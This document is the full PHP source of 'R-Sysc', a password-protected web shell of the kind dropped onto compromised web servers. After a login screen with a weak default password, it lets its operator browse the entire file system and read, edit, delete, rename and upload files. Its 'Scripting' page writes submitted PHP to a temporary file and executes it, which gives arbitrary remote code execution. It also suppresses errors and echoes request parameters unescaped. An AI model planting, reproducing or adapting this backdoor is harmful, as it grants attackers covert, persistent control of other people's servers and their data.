<!DOCTYPE html>
<?php
/*
R-Sysc
Copyright (C)2024 - R&D incrustwerush.org
*/
error_reporting(0);
// header('HTTP/1.0 404 Not Found', true, 404);
session_start();

$pass = "password";

if ($_POST['passwd'] == $pass) {
    $_SESSION['R-Sysc'] = $pass;
    echo "<script>window.location='?'</script>";
}
if ($_GET['page'] == "blank") {
    echo "<a href='?'>Back</a>";
    exit();
}
if (isset($_REQUEST['logout'])) {
    session_destroy();
    echo "<script>window.location='?'</script>";
}
if (!($_SESSION['R-Sysc'])) {
?>
    <!DOCTYPE html>
    <html>

    <head>
        <title>R-Sysc</title>
        <link rel="icon" href="https://incrustwerush.org/img/site/image.png">
        <style>
            html,
            body {
                height: 100%;
                margin: 0;
                padding: 0;
                overflow: hidden;
                background: black;
                color: white;
                font-family: "Courier New";
                display: flex;
                justify-content: center;
                align-items: center;
            }

            input {
                background: transparent;
                color: white;
                height: 40px;
                border: 1px solid white;
                border-radius: 20px;
                padding: 5px;
                font-size: 20px;
            }

            .img {
                width: 170px;
                border: 3px solid white;
                border-radius: 20px;
            }
        </style>
    </head>

    <body>
        <table>
            <tr>
                <td align="center">
                    <form enctype="multipart/form-data" method="post">
                        <img class="img" src="https://incrustwerush.org/img/site/image.png" />
                        <br><br>
                        <font size="5">( R-Sysc )</font>
                        <br><br>
                        <input type="password" name="passwd" placeholder="Enter the password....">
                        <input type="submit" value="Login">
                        <br>
                        <?php echo $_SESSION['R-Sysc']; ?>
                    </form>
                </td>
            </tr>
        </table>
    </body>

    </html>

<?php
    exit();
}

if (isset($_GET['scripting'])) {

    if (!empty($_POST['code'])) {

        $temp_file = tmpfile();
        $_SESSION['script'] = $_POST['code'];
        $_SESSION['tmp_script'] = stream_get_meta_data($temp_file)['uri'];
        echo "<script>window.location = '?';</script>";

    }
}

if (!empty($_SESSION['tmp_script'])) {

    if (isset($_GET['clear_script'])) {

        unlink($_SESSION['tmp_script']);
        unset($_SESSION['tmp_script']);
        unset($_SESSION['script']);
        echo "<script>window.location = '?';</script>";
    }

    echo "<title>Scripting</title>";
    echo "<div style=\"margin: 0; padding: 20px; background: black;\">";
    echo "<a style=\"margin: 10px; text-decoration: underline; color: black; font-size: 50px; padding: 10px; background: white;\" href=\"?clear_script=true\">Click for Clear Script</a>";
    echo "</div><hr>";

    $f = fopen($_SESSION['tmp_script'], 'w');
    fwrite($f, $_SESSION['script']);
    fclose($f);

    require_once($_SESSION['tmp_script']);

    exit();
}

$dir_raw = str_replace('\\', "/", getcwd());
$host = $_SERVER['HTTP_HOST'];
if ($dn = $_GET['d']) {
    $_SESSION['dir'] = realpath($dn);
    echo "<script>window.location = '?';</script>";
}
if (empty($_SESSION['dir'])) {
    $dir = $dir_raw;
} else {
    $dir = $_SESSION['dir'];
}
$exp = explode("/", $dir);
foreach ($exp as $x => $dirx) {
    if (empty($dirx)) {
        continue;
    }
    $do .= "<li class='bar'><a class='a-bar' href='?d=";
    for ($i = 0; $i <= $x; $i++) {
        $do .= $exp[$i] . "/";
    }
    $do .= "'>$dirx</a></li>\n";
}
chdir($dir);
?>
<html>

<head>
    <title>R-Sysc</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="icon" href="https://incrustwerush.org/img/site/image.png">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.1/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.1/theme/material-darker.min.css">
    <style>
        html {
            overflow: auto;
            background: black;
            color: white;
            font-family: "monospace";
            font-size: 12px;
        }

        .container {

            display: flex;
            flex-wrap: wrap;

        }

        .item25 {

            width: 25%;
            border: 1px solid white;
            padding: 10px;
            box-sizing: border-box;

        }

        .item75 {

            width: 75%;
            border: 1px solid white;
            padding: 10px;
            box-sizing: border-box;

        }

        @media (max-width: 768px) {

            .item25 {

                width: 100%;
                border: 1px solid white;
                padding: 10px;
                margin-bottom: 20px;
                word-wrap: break-word;

            }

            .item75 {

                width: 100%;
                border: 1px solid white;
                padding: 10px;
                margin-bottom: 20px;
                word-wrap: break-word;

            }

            .l {
                float: left;
                width: 50%;
            }

            .r {
                float: right;
                width: 50%;
                text-align: right;
            }

        }

        a {
            text-decoration: none;
            color: white;
        }

        a:hover {
            background-color: white;
            text-decoration: underline;
            color: black;
        }

        .a-bar {
            text-decoration: none;
            color: black;
        }

        .bar {
            display: inline-block;
            padding: 10px 15px;
            padding: 5px;
            background: white;
            color: black;
            margin: 5px 0;
            white-space: normal;
            line-height: 1.5;
        }

        .tidy-item {

            display: inline-block;
            padding: 10px 15px;
            padding: 5px;
            margin: 1px 0;
            white-space: normal;
            line-height: 1;

        }

        .bartop {
            overflow: auto;
            border: 1px solid white;
            padding: 10px;
            background: white;
            color: black;
        }

        .close {
            overflow: auto;
            border: 1px solid red;
            background: red;
            color: white;
        }

        .box-item {
            overflow: auto;
            border: 1px solid white;
            padding: 10px;
            color: white;
        }

        .l {
            float: left;
            width: 50%;
        }

        .r {
            float: right;
            width: 50%;
            text-align: right;
        }

        input {
            background: white;
            color: black;
            border: 1px solid white;
            padding: 5px;
        }

        .file {
            width: 100%;
            height: 1000px;
        }

        .CodeMirror {
            height: 500px;
            border: 1px solid black;
            font-size: 10px;
        }
    </style>
</head>

<body>
    <div class="bartop">
        <div class="l">
            R-Sysc - R&D incrustwerush.org
        </div>
        <div class="r">
            <a class="a-bar" href="?page=blank">[_]</a>
            <a class="a-bar" href="?page=blank">[-]</a>
            <a class="close" href="?logout">[X]</a>
        </div>
    </div>
    <div class="box-item">
        <div class="tidy-item">
            [ <a href="?">File Manager</a> ]
        </div>
        <div class="tidy-item">
            [ <a href="?page=upload">Upload</a> ]
        </div>
        <div class="tidy-item">
            [ <a href="?page=scripting">Scripting ( PHP )</a> ]
        </div>
        <div class="tidy-item">
            [ <a href="?page=about">About</a> ]
        </div>
    </div>
    <div class="box-item">
        [ Directory ] => <li class="bar"><a class="a-bar" href="?d=/">/</a></li><?php echo "\n" . $do; ?>
    </div>
    <div class="box-item">
        <div class="container">
            <div class="item25">
                <div class="bartop">
                    Action
                </div>
                <hr>
                [*] <a href="?page=newfile">New File</a>
                <br>
                [*] <a href="?page=newfolder">New Folder</a>
                <hr>
                <div class="bartop">
                    Others
                </div>
                <hr>
                [*] <a href="?d=<?= __DIR__; ?>">Home Directory</a>
                <br>
            </div>
            <div class="item75">
                <?php
                if ($_GET['file']) {
                ?>
                    <div class='tidy-item'>
                        [ <a href="?file=<?php echo $_GET['file']; ?>&delete=true">Delete</a> ]
                    </div>
                    <div class='tidy-item'>
                        [ <a href="?file=<?php echo $_GET['file']; ?>&edit=true">Edit</a> ]
                    </div>
                    <div class='tidy-item'>
                        [ <a href="?file=<?php echo $_GET['file']; ?>&rename=true">Rename</a> ]
                    </div>
                    <div class='tidy-item'>
                        [ <a href="?">Back</a> ]
                    </div>
                    <hr>
                <?php
                    if (!$_GET['edit'] && !$_GET['delete'] && !$_GET['rename']) {
                        echo "<textarea id='editor' class='file'>" . htmlspecialchars(file_get_contents($_GET['file'])) . "</textarea>";
                    }
                    if ($_GET['edit'] == "true") {
                        echo "<form enctype='multipart/form-data' method='post'>
        <textarea id='editor' class='file' name='edit_file'>" . htmlspecialchars(file_get_contents($_GET['file'])) . "</textarea>
        <br><br>
        <input type='submit' value='Save File'>
        </form>
        ";
                        if ($_POST['edit_file']) {
                            $fedit = fopen($_GET['file'], "w");
                            if (fwrite($fedit, $_POST['edit_file'])) {
                                fclose($fedit);
                                echo "<script>alert('Edit File Success !!!'); window.location = '?file=$_GET[file]';</script>";
                            } else {
                                echo "<script>alert('Edit File Failed !!!'); window.location = '?file=$_GET[file]';</script>";
                            }
                        }
                    }
                    if ($_GET['delete'] == "true") {
                        if (unlink($_GET['file'])) {
                            echo "<script>alert('File Deleted !!!'); window.location = '?';</script>";
                        } else {
                            echo "<script>alert('Failed Deleted File !!!'); window.location = '?file=$_GET[file]';</script>";
                        }
                    }
                    if ($_GET['rename'] == "true") {
                        echo "<form enctype='multipart/form-data' method='post'>
                    <div class='tidy-item'>
        " . htmlspecialchars($_GET['file']) . " [ To ] 
        </div>
        <div class='tidy-item'>
            <input type='text' name='rename_file'>
        </div>
        <div class='tidy-item'>
            <input type='submit' value='Rename'>
        </div>
        </form>
        ";
                        if ($_POST['rename_file']) {
                            if (copy($_GET['file'], $_POST['rename_file'])) {
                                unlink($_GET['file']);
                                echo "<script>alert('File Renamed !!!'); window.location = '?';</script>";
                            } else {
                                echo "<script>alert('Failed Rename File !!!'); window.location = '?file=$_GET[file]';</script>";
                            }
                        }
                    }
                }
                if (!$_GET) {
                    echo "<form enctype='multipart/form-data' method='post'>
    <div class='tidy-item'>
        Rename This Folder : <input type='text' name='rename_folder'>
    </div>
    <div class='tidy-item'>
        <input type='submit' value='Rename'>
    </div>
    <div class='tidy-item'>
        <a class='bartop' href='?remove_folder=$dir'>Remove This Folder</a>
    </div>
    </form>
    <hr>
    ";

                    if (isset($_POST['rename_folder'])) {
                        if (mkdir("../" . $_POST['rename_folder'])) {
                            rmdir($dir);
                            $rpath = implode("/", array_slice(explode("/", $dir), 0, -1));
                            echo "<script>alert('This Folder is Renamed !!!'); window.location = '?d=" . $rpath . "';</script>";
                        } else {
                            echo "<script>alert('This Folder is Failed Rename !!!'); window.location = '?';</script>";
                        }
                    }

                    $scndir = scandir($dir);

                    foreach ($scndir as $sdir) {
                        if (is_dir($dir . "/" . $sdir)) {
                            echo "<a href='?d=$dir/$sdir'><img height='20' src='https://raw.githubusercontent.com/ICWR-TEAM/R-Sysc/main/folder.png'/> " . htmlspecialchars($sdir) . "</a><br>";
                        }
                    }

                    foreach ($scndir as $sdir) {

                        if (is_file($dir . "/" . $sdir)) {
                            echo "<a href='?file=$dir/$sdir'><img height='20' src='https://raw.githubusercontent.com/ICWR-TEAM/R-Sysc/main/file.png'/> " . htmlspecialchars($sdir) . "</a><br>";
                        }
                    }
                }

                if (isset($_GET['remove_folder'])) {

                    $rpath = implode("/", array_slice(explode("/", $dir), 0, -1));
                    if (rmdir($dir)) {
                        echo "<script>alert('Folder Deleted !!!'); window.location = '?d=$rpath';</script>";
                    } else {
                        echo "<script>alert('This Folder is Failed Delete !!!'); window.location = '?d=$rpath';</script>";
                    }
                }

                if ($_GET['page'] == "upload") {
                    echo "Upload File
    <br><br>
    <form enctype='multipart/form-data' method='post'>
    <div class='tidy-item'>
        <input type='file' name='up'>
    </div>
    <div class='tidy-item'>
        <input type='submit' value='Upload'>
    </div>
    </form>
    ";
                    if ($_FILES['up']) {
                        if (copy($_FILES['up']['tmp_name'], $_FILES['up']['name'])) {
                            echo "[+] Success : " . $_FILES['up']['name'];
                        } else {
                            echo "[-] Failed : " . $_FILES['up']['name'];
                        }
                        echo "<br>";
                    }
                }
                if ($_GET['page'] == "scripting") {
                    if (empty($str_code)) {
                        $str_code = "<?php echo 'Hello World'; ?>";
                    } else {
                        $str_code = htmlspecialchars($_SESSION['code']);
                    }
                    echo "<form action='?scripting=true' enctype='multipart/form-data' method='post'>
                    <center>Running PHP Script</center>
                    <hr>
                    <textarea id='editor' class='file' name='code'>$str_code</textarea>
                    <bR><br>
                    <input type='submit' value='Run Script !!!'>
                </form>
                ";
                }
                if ($_GET['page'] == "about") {
                    echo "
                <center>
                    <font size='20'>R-Sysc</font>
                    <br><br>
                    <font size='5'>R&D incrustwerush.org</font>
                    <br><br>
                    We Strive Even Harder
                    <br><br>
                    Release : <a href='https://github.com/ICWR-TEAM/R-Sysc'>https://github.com/ICWR-TEAM/R-Sysc</a>
                </center>
                ";
                }
                if ($_GET['page'] == "newfile") {
                    echo "<form enctype='multipart/form-data' method='post'>
                    <textarea id='editor' class='file' name='isi_file'></textarea>
                    <br><br>
                    <input type='text' name='name_file'>
                    <br><bR>
                    <input type='submit' value='Save File'>
                </form>
                ";
                    if ($_POST['name_file']) {
                        $nfile = fopen($_POST['name_file'], "w");
                        if (fwrite($nfile, $_POST['isi_file'])) {
                            echo "<script>
                alert('File Created !!!');
                window.location = '?';
                </script>";
                        } else {
                            echo "<script>
                alert('Created File Failed !!!');
                window.location = '?';
                </script>";
                        }
                    }
                }
                if ($_GET['page'] == "newfolder") {
                    echo "<form enctype='multipart/form-data' method='post'>
                    <div class='tidy-item'>
                        New Folder : <input type='text' name='name_folder'>
                    </div>
                    <div class='tidy-item'>
                        <input type='submit' value='Create Folder'>
                    </div>
                </form>
                ";
                    if ($_POST['name_folder']) {
                        if (mkdir($_POST['name_folder'])) {
                            echo "<script>
                alert('Folder Created !!!');
                window.location = '?';
                </script>";
                        } else {
                            echo "<script>
                alert('Created Folder Failed !!!');
                window.location = '?';
                </script>";
                        }
                    }
                }
                ?>
            </div>
        </div>

    </div>
    <div class="box-item">
        <div class="l">
            Free Space :
            <?php echo round((disk_free_space("/") / (1024 * 1024 * 1024)), 2) . ' / ' . round((disk_total_space("/") / (1024 * 1024 * 1024)), 2); ?>
            GB
        </div>
        <div class="r">
            Copyright &copy;2024 - R&D incrustwerush.org
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.1/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.1/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.1/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.1/mode/css/css.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.1/mode/htmlmixed/htmlmixed.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.1/mode/php/php.min.js"></script>
    <script>
        var editor = CodeMirror.fromTextArea(document.getElementById("editor"), {
            lineNumbers: true,
            mode: "htmlmixed",
            theme: "material-darker",
            lineWrapping: false,
            indentUnit: 4,
            tabSize: 4
        });
    </script>
</body>

</html>
